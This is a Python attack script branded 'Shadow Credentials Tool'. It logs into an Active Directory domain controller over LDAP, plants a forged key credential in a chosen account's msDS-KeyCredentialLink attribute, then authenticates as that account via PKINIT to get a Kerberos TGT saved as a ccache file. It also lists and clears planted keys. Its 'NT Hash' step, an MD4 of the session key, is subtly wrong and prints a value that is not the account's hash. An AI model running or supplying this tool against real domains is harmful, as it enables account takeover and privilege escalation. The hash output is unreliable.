#!/usr/bin/env python3
import os
import sys
import re
import socket
import signal
import struct
import hashlib
import secrets
import ssl
import platform
import datetime
import binascii
import string
import random
import ldap3
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE
from ldap3.core.exceptions import LDAPBindError
from cryptography import x509 as cx509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption

# pywhisker logic - dsinternals
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime

# gettgtpkinit.py logic - asn1crypto + oscrypto
from asn1crypto import cms, algos, keys, core
from oscrypto.keys import parse_certificate, parse_private
from oscrypto.asymmetric import rsa_pkcs1v15_sign, load_private_key

# minikerberos structures
from minikerberos import logger as minikerberos_logger
from minikerberos.pkinit import PKINIT, DirtyDH
from minikerberos.common.ccache import CCACHE
from minikerberos.common.target import KerberosTarget
from minikerberos.network.clientsocket import KerberosClientSocket
from minikerberos.protocol.constants import NAME_TYPE, PaDataType
from minikerberos.protocol.encryption import Enctype, _enctype_table, Key
from minikerberos.protocol.asn1_structs import KDC_REQ_BODY, PrincipalName, KDCOptions, EncASRepPart, AS_REQ, PADATA_TYPE, PA_PAC_REQUEST
from minikerberos.protocol.rfc4556 import PKAuthenticator, AuthPack, PA_PK_AS_REP, KDCDHKeyInfo, PA_PK_AS_REQ

from colorama import Fore, Style, init
init(autoreset=True)

# ============================================================
# Static DH params (same as gettgtpkinit.py)
# ============================================================
DH_PARAMS = {
    'p': int('00ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece65381ffffffffffffffff', 16),
    'g': 2
}


def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)


def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║              Shadow Credentials Tool                      ║
    ║        Exploit AddKeyCredentialLink via PKINIT            ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Running on: {platform.system()} {platform.release()}" + Style.RESET_ALL)


def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip): return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))

def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain): return False
    for part in domain.split('.'):
        if part.startswith('-') or part.endswith('-') or not part: return False
    return True

def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)

def check_ip_reachable(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, 445))
        sock.close()
        return result == 0
    except: return False

def check_credentials_and_domain(dc_ip, domain, username, password):
    try:
        base_dn = ','.join([f"DC={part}" for part in domain.split('.')])
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        conn.search(base_dn, '(objectClass=domain)', SUBTREE, attributes=['dc'])
        result = len(conn.entries) > 0
        conn.unbind()
        return result
    except LDAPBindError: return "invalid_credentials"
    except: return False

def ldap_connect(dc_ip, domain, username, password):
    try:
        server = Server(dc_ip, get_info=ALL, connect_timeout=5)
        conn = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        return conn
    except Exception as e:
        print(Fore.RED + f"[-] LDAP connection failed: {e}" + Style.RESET_ALL)
        return None

def get_base_dn(domain):
    return ','.join([f"DC={part}" for part in domain.split('.')])

def get_object_dn(conn, base_dn, sam):
    try:
        conn.search(base_dn, f'(sAMAccountName={sam})', SUBTREE,
                    attributes=['distinguishedName', 'objectSid', 'msDS-KeyCredentialLink'])
        return conn.entries[0] if conn.entries else None
    except: return None


# ============================================================
# PKINIT class (matching gettgtpkinit.py myPKINIT logic)
# ============================================================
class MyPKINIT(PKINIT):
    @staticmethod
    def from_cert_key(cert_obj, private_key, dh_params=None):
        """Initialize from cryptography cert + private key objects"""
        pkinit = MyPKINIT()
        # Convert to PEM for oscrypto
        cert_pem = cert_obj.public_bytes(serialization.Encoding.PEM)
        key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        pkinit.certificate = parse_certificate(cert_pem)
        pkinit.privkey = load_private_key(parse_private(key_pem))
        pkinit.setup(dh_params=dh_params)
        return pkinit

    def setup(self, dh_params=None):
        self.issuer = self.certificate.issuer.native['common_name']
        if dh_params is not None:
            if isinstance(dh_params, dict):
                self.diffie = DirtyDH.from_dict(dh_params)
            elif isinstance(dh_params, DirtyDH):
                self.diffie = dh_params
            else:
                self.diffie = DirtyDH.from_dict(DH_PARAMS)
        else:
            self.diffie = DirtyDH.from_dict(DH_PARAMS)

    def sign_authpack(self, data, wrap_signed=False):
        return self.sign_authpack_native(data, wrap_signed)

    def build_asreq(self, domain=None, cname=None, kdcopts=['forwardable', 'renewable', 'renewable-ok']):
        if isinstance(kdcopts, list): kdcopts = set(kdcopts)
        if cname is not None:
            if isinstance(cname, str): cname = [cname]
        else:
            cname = [self.cname]

        now = datetime.datetime.now(datetime.timezone.utc)

        kdc_req_body_data = {
            'kdc-options': KDCOptions(kdcopts),
            'cname': PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': cname}),
            'realm': domain.upper(),
            'sname': PrincipalName({'name-type': NAME_TYPE.SRV_INST.value, 'name-string': ['krbtgt', domain.upper()]}),
            'till': (now + datetime.timedelta(days=1)).replace(microsecond=0),
            'rtime': (now + datetime.timedelta(days=1)).replace(microsecond=0),
            'nonce': secrets.randbits(31),
            'etype': [18, 17]
        }
        kdc_req_body = KDC_REQ_BODY(kdc_req_body_data)

        checksum = hashlib.sha1(kdc_req_body.dump()).digest()

        authenticator = {
            'cusec': now.microsecond,
            'ctime': now.replace(microsecond=0),
            'nonce': secrets.randbits(31),
            'paChecksum': checksum
        }

        dp = {'p': self.diffie.p, 'g': self.diffie.g, 'q': 0}
        pka = {'algorithm': '1.2.840.10046.2.1', 'parameters': keys.DomainParameters(dp)}
        spki = {'algorithm': keys.PublicKeyAlgorithm(pka), 'public_key': self.diffie.get_public_key()}

        authpack = {
            'pkAuthenticator': PKAuthenticator(authenticator),
            'clientPublicValue': keys.PublicKeyInfo(spki),
            'clientDHNonce': self.diffie.dh_nonce
        }
        authpack = AuthPack(authpack)
        signed_authpack = self.sign_authpack(authpack.dump(), wrap_signed=True)

        payload = PA_PK_AS_REQ()
        payload['signedAuthPack'] = signed_authpack

        pa_data_1 = {'padata-type': PaDataType.PK_AS_REQ.value, 'padata-value': payload.dump()}
        pa_data_0 = {'padata-type': int(PADATA_TYPE('PA-PAC-REQUEST')), 'padata-value': PA_PAC_REQUEST({'include-pac': True}).dump()}

        asreq = {
            'pvno': 5, 'msg-type': 10,
            'padata': [pa_data_0, pa_data_1],
            'req-body': kdc_req_body
        }
        return AS_REQ(asreq).dump()

    def sign_authpack_native(self, data, wrap_signed=False):
        da = {'algorithm': algos.DigestAlgorithmId('1.3.14.3.2.26')}  # SHA1

        si = {
            'version': 'v1',
            'sid': cms.IssuerAndSerialNumber({
                'issuer': self.certificate.issuer,
                'serial_number': self.certificate.serial_number,
            }),
            'digest_algorithm': algos.DigestAlgorithm(da),
            'signed_attrs': [
                cms.CMSAttribute({'type': 'content_type', 'values': ['1.3.6.1.5.2.3.1']}),
                cms.CMSAttribute({'type': 'message_digest', 'values': [hashlib.sha1(data).digest()]}),
            ],
            'signature_algorithm': algos.SignedDigestAlgorithm({'algorithm': '1.2.840.113549.1.1.1'}),
            'signature': rsa_pkcs1v15_sign(self.privkey, cms.CMSAttributes([
                cms.CMSAttribute({'type': 'content_type', 'values': ['1.3.6.1.5.2.3.1']}),
                cms.CMSAttribute({'type': 'message_digest', 'values': [hashlib.sha1(data).digest()]}),
            ]).dump(), "sha1")
        }

        ec = {'content_type': '1.3.6.1.5.2.3.1', 'content': data}

        sd = {
            'version': 'v3',
            'digest_algorithms': [algos.DigestAlgorithm(da)],
            'encap_content_info': cms.EncapsulatedContentInfo(ec),
            'certificates': [self.certificate],
            'signer_infos': cms.SignerInfos([cms.SignerInfo(si)])
        }

        if wrap_signed:
            ci = {'content_type': '1.2.840.113549.1.7.2', 'content': cms.SignedData(sd)}
            return cms.ContentInfo(ci).dump()
        return cms.SignedData(sd).dump()

    def decrypt_asrep(self, as_rep):
        def truncate_key(value, keysize):
            output = b''
            currentNum = 0
            while len(output) < keysize:
                currentDigest = hashlib.sha1(bytes([currentNum]) + value).digest()
                if len(output) + len(currentDigest) > keysize:
                    output += currentDigest[:keysize - len(output)]
                    break
                output += currentDigest
                currentNum += 1
            return output

        for pa in as_rep['padata']:
            if pa['padata-type'] == 17:
                pkasrep = PA_PK_AS_REP.load(pa['padata-value']).native
                break
        else:
            raise Exception('PA_PK_AS_REP not found!')

        ci = cms.ContentInfo.load(pkasrep['dhSignedData']).native
        sd = ci['content']
        keyinfo = sd['encap_content_info']
        if keyinfo['content_type'] != '1.3.6.1.5.2.3.2':
            raise Exception('Keyinfo content type unexpected value')
        authdata = KDCDHKeyInfo.load(keyinfo['content']).native

        pubkey = int.from_bytes(core.BitString(authdata['subjectPublicKey']).dump()[7:], 'big', signed=False)
        shared_key = self.diffie.exchange(pubkey)

        server_nonce = pkasrep['serverDHNonce']
        fullKey = shared_key + self.diffie.dh_nonce + server_nonce

        etype = as_rep['enc-part']['etype']
        cipher = _enctype_table[etype]
        if etype == Enctype.AES256:
            t_key = truncate_key(fullKey, 32)
        elif etype == Enctype.AES128:
            t_key = truncate_key(fullKey, 16)
        else:
            t_key = truncate_key(fullKey, 32)

        key = Key(cipher.enctype, t_key)
        enc_data = as_rep['enc-part']['cipher']
        dec_data = cipher.decrypt(key, 3, enc_data)
        encasrep = EncASRepPart.load(dec_data).native
        cipher = _enctype_table[int(encasrep['key']['keytype'])]
        session_key = Key(cipher.enctype, encasrep['key']['keyvalue'])
        return encasrep, session_key, cipher


# ============================================================
# Export to PFX (matching pywhisker)
# ============================================================
def export_pfx(key_obj, cert_obj, password=None, out_file='cert.pfx'):
    if password is None:
        encryption_algo = NoEncryption()
    else:
        encryption_algo = BestAvailableEncryption(password.encode('utf-8'))

    pfx_data = serialize_key_and_certificates(
        name=b"ShadowCredentialCert",
        key=key_obj,
        cert=cert_obj,
        cas=None,
        encryption_algorithm=encryption_algo
    )
    with open(out_file, 'wb') as f:
        f.write(pfx_data)
    return out_file


# ============================================================
# Get NT Hash via PKINIT + Save CCache
# ============================================================
def get_nt_hash_via_pkinit(dc_ip, domain, target_sam, private_key, cert):
    print(Fore.YELLOW + "[*] Building PKINIT AS-REQ (minikerberos + asn1crypto)..." + Style.RESET_ALL)
    try:
        # Initialize PKINIT with cert + key
        pkinit = MyPKINIT.from_cert_key(cert, private_key, DH_PARAMS)

        # Build AS-REQ
        as_req = pkinit.build_asreq(domain=domain, cname=target_sam)

        print(Fore.YELLOW + "[*] Sending PKINIT AS-REQ to KDC..." + Style.RESET_ALL)
        sock = KerberosClientSocket(KerberosTarget(dc_ip))
        res = sock.sendrecv(as_req)

        if not res:
            print(Fore.RED + "[-] No response from KDC!" + Style.RESET_ALL)
            return None, None

        print(Fore.YELLOW + f"[*] Got response: {len(res.dump())} bytes" + Style.RESET_ALL)

        # Decrypt AS-REP
        encasrep, session_key, cipher = pkinit.decrypt_asrep(res.native)

        # Build CCache
        ccache = CCACHE()
        ccache.add_tgt(res.native, encasrep)
        
        # Save CCache file
        ccache_path = f"{target_sam}.ccache"
        ccache.to_file(ccache_path)
        print(Fore.GREEN + f"[+] TGT saved to: {ccache_path}" + Style.RESET_ALL)

        # Extract NT Hash
        nt_hash = hashlib.new('md4', encasrep['key']['keyvalue']).digest()
        print(Fore.GREEN + "[+] Decrypted AS-REP successfully!" + Style.RESET_ALL)
        
        return nt_hash.hex(), ccache_path

    except Exception as e:
        error_str = str(e)
        print(Fore.RED + f"[-] PKINIT failed: {error_str[:100]}" + Style.RESET_ALL)
        return None, None


# ============================================================
# Core operations (matching pywhisker logic)
# ============================================================
def add_key_credential(conn, base_dn, target_sam, dc_ip, domain):
    print(Fore.CYAN + f"\n[*] Adding KeyCredentialLink to '{target_sam}'..." + Style.RESET_ALL)

    entry = get_object_dn(conn, base_dn, target_sam)
    if not entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return

    target_dn = str(entry.distinguishedName)
    print(Fore.YELLOW + f"[*] Target DN: {target_dn}" + Style.RESET_ALL)

    # Use dsinternals X509Certificate2 + KeyCredential (pywhisker logic)
    print(Fore.YELLOW + "[*] Generating certificate (X509Certificate2)..." + Style.RESET_ALL)
    certificate = X509Certificate2(subject=target_sam, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
    
    # Get the private key and cert as cryptography objects
    pfx_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
    
    # Export cert + key to PEM first (pywhisker style)
    path = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
    certificate.ExportPEM(path_to_files=path)
    
    cert_pem_file = path + "_cert.pem"
    key_pem_file = path + "_priv.pem"
    
    # Load with cryptography
    with open(cert_pem_file, 'rb') as f:
        cert_obj = cx509.load_pem_x509_certificate(f.read(), default_backend())
    with open(key_pem_file, 'rb') as f:
        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())

    print(Fore.GREEN + "[+] Certificate generated!" + Style.RESET_ALL)

    # Generate KeyCredential
    print(Fore.YELLOW + "[*] Generating KeyCredential..." + Style.RESET_ALL)
    keyCredential = KeyCredential.fromX509Certificate2(
        certificate=certificate,
        deviceId=Guid(),
        owner=target_dn,
        currentTime=DateTime(),
        isComputerKey=True
    )
    print(Fore.GREEN + f"[+] KeyCredential generated! DeviceID: {keyCredential.DeviceId.toFormatD()}" + Style.RESET_ALL)

    # Read existing values
    conn.search(target_dn, '(objectClass=*)', 'BASE', attributes=['msDS-KeyCredentialLink'])
    existing_raw = []
    if conn.entries:
        for v in conn.entries[0]['msDS-KeyCredentialLink'].raw_values:
            existing_raw.append(v)

    new_values = existing_raw + [keyCredential.toDNWithBinary().toString()]

    print(Fore.YELLOW + "[*] Updating msDS-KeyCredentialLink..." + Style.RESET_ALL)
    result = conn.modify(target_dn, {'msDS-KeyCredentialLink': [(MODIFY_REPLACE, new_values)]})

    # Clean up PEM files
    for f in [cert_pem_file, key_pem_file]:
        try: os.remove(f)
        except: pass

    if not result:
        err = conn.result.get('description', 'unknown')
        print(Fore.RED + f"[-] AddKeyCredentialLink failed: {err}" + Style.RESET_ALL)
        return

    print(Fore.GREEN + f"[+] KeyCredentialLink added to '{target_sam}'!" + Style.RESET_ALL)

    # Attempt PKINIT
    print(Fore.YELLOW + "\n[*] Attempting PKINIT to retrieve NT Hash..." + Style.RESET_ALL)
    nt_hash, ccache_path = get_nt_hash_via_pkinit(dc_ip, domain, target_sam, private_key, cert_obj)

    if nt_hash:
        print(Fore.GREEN + f"\n[+] NT Hash for '{target_sam}':" + Style.RESET_ALL)
        print(Fore.GREEN + f"    {target_sam}:{nt_hash}" + Style.RESET_ALL)
        if ccache_path:
            print(Fore.GREEN + f"[+] TGT saved to: {ccache_path}" + Style.RESET_ALL)
            print(Fore.YELLOW + f"[*] Use: export KRB5CCNAME={ccache_path}" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[-] Could not retrieve NT Hash via PKINIT!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] KeyCredentialLink was added successfully." + Style.RESET_ALL)
        print(Fore.YELLOW + "[*] You can manually use PKINITtools to get the TGT." + Style.RESET_ALL)


def list_key_credentials(conn, base_dn, target_sam):
    print(Fore.CYAN + f"\n[*] Listing KeyCredentialLinks for '{target_sam}'..." + Style.RESET_ALL)
    entry = get_object_dn(conn, base_dn, target_sam)
    if not entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(entry.distinguishedName)
    conn.search(target_dn, '(objectClass=*)', 'BASE', attributes=['msDS-KeyCredentialLink'])
    if not conn.entries:
        print(Fore.YELLOW + "[*] No data found." + Style.RESET_ALL)
        return
    raw_values = conn.entries[0]['msDS-KeyCredentialLink'].raw_values
    if not raw_values:
        print(Fore.YELLOW + "[*] No KeyCredentialLinks found." + Style.RESET_ALL)
        return
    print(Fore.GREEN + f"[+] Found {len(raw_values)} KeyCredentialLink(s):" + Style.RESET_ALL)
    for i, v in enumerate(raw_values):
        try:
            kc = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(v))
            print(Fore.WHITE + f"  [{i+1}] DeviceID: {kc.DeviceId.toFormatD()}" + Style.RESET_ALL)
        except:
            print(Fore.WHITE + f"  [{i+1}] {v.decode('utf-8')[:80]}" + Style.RESET_ALL)


def clear_key_credentials(conn, base_dn, target_sam):
    print(Fore.CYAN + f"\n[*] Clearing all KeyCredentialLinks from '{target_sam}'..." + Style.RESET_ALL)
    entry = get_object_dn(conn, base_dn, target_sam)
    if not entry:
        print(Fore.RED + f"[-] User '{target_sam}' not found!" + Style.RESET_ALL)
        return
    target_dn = str(entry.distinguishedName)
    result = conn.modify(target_dn, {'msDS-KeyCredentialLink': [(MODIFY_REPLACE, [])]})
    if result:
        print(Fore.GREEN + f"[+] All KeyCredentialLinks cleared from '{target_sam}'!" + Style.RESET_ALL)
    else:
        print(Fore.RED + f"[-] Clear failed: {conn.result.get('description', 'unknown')}" + Style.RESET_ALL)


# ============================================================
# Main Menu
# ============================================================
def main_menu(conn, base_dn, domain, dc_ip):
    while True:
        print(Fore.CYAN + "\n" + "=" * 62 + Style.RESET_ALL)
        print(Fore.CYAN + "  [ Shadow Credentials - AddKeyCredentialLink ]" + Style.RESET_ALL)
        print(Fore.CYAN + "=" * 62 + Style.RESET_ALL)
        print(Fore.WHITE + """
    1.  Add KeyCredentialLink    - Add shadow credential + get NT Hash + CCache
    2.  List KeyCredentialLinks  - Show existing keys on target
    3.  Clear KeyCredentialLinks - Remove all keys from target
    0.  Exit
    """ + Style.RESET_ALL)

        choice = get_input(Fore.CYAN + "[?] Choice: " + Style.RESET_ALL)
        if choice == '0':
            print(Fore.YELLOW + "\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)
        elif choice == '1':
            target_sam = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
            add_key_credential(conn, base_dn, target_sam, dc_ip, domain)
        elif choice == '2':
            target_sam = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
            list_key_credentials(conn, base_dn, target_sam)
        elif choice == '3':
            target_sam = get_input(Fore.CYAN + "[?] Enter target username: " + Style.RESET_ALL)
            confirm = get_input(Fore.RED + f"[!] Clear ALL keys from '{target_sam}'? (yes/no): " + Style.RESET_ALL)
            if confirm.lower() == 'yes':
                clear_key_credentials(conn, base_dn, target_sam)
            else:
                print(Fore.YELLOW + "[*] Cancelled." + Style.RESET_ALL)
        else:
            print(Fore.RED + "[!] Invalid choice!" + Style.RESET_ALL)


if __name__ == '__main__':
    banner()

    dc_ip = get_input(Fore.CYAN + "[?] Enter DC IP Address  : " + Style.RESET_ALL, validate_ip, "Invalid IP!")
    print(Fore.YELLOW + "[*] Checking DC reachability..." + Style.RESET_ALL)
    if not check_ip_reachable(dc_ip):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain = get_input(Fore.CYAN + "[?] Enter Domain Name    : " + Style.RESET_ALL, validate_domain, "Invalid domain!")
    username = get_input(Fore.CYAN + "[?] Enter Username       : " + Style.RESET_ALL)
    password = get_input(Fore.CYAN + "[?] Enter Password       : " + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Verifying credentials..." + Style.RESET_ALL)
    result = check_credentials_and_domain(dc_ip, domain, username, password)
    if result == "invalid_credentials":
        print(Fore.RED + "[!] Invalid credentials!" + Style.RESET_ALL)
        sys.exit(1)
    elif not result:
        print(Fore.RED + f"[!] Domain '{domain}' not found!" + Style.RESET_ALL)
        sys.exit(1)
    print(Fore.GREEN + "[+] Credentials verified!" + Style.RESET_ALL)

    print(Fore.YELLOW + "\n[*] Connecting to LDAP..." + Style.RESET_ALL)
    conn = ldap_connect(dc_ip, domain, username, password)
    if not conn:
        sys.exit(1)
    print(Fore.GREEN + "[+] LDAP connected!" + Style.RESET_ALL)

    base_dn = get_base_dn(domain)
    main_menu(conn, base_dn, domain, dc_ip)
